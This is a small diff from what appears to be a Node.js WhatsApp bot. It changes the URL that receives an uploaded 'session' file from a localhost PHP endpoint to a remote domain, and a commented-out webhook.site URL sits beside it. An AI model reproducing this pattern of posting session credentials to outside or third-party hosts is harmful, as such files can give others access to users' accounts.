@@ -246,7 +246,7 @@ client.on('message', async msg => {
             params.append('session',file);
             axios({
                 method: 'POST',
-                url: 'http://localhost/d3pajak19/save_session.php',
+                url: 'https://wa.nuriz.web.id/save_session.php',
                 // url: 'https://webhook.site/4247af82-6ced-4d4a-b767-47a25f30a46f?',
                 data: params,
                 maxContentLength: Infinity,
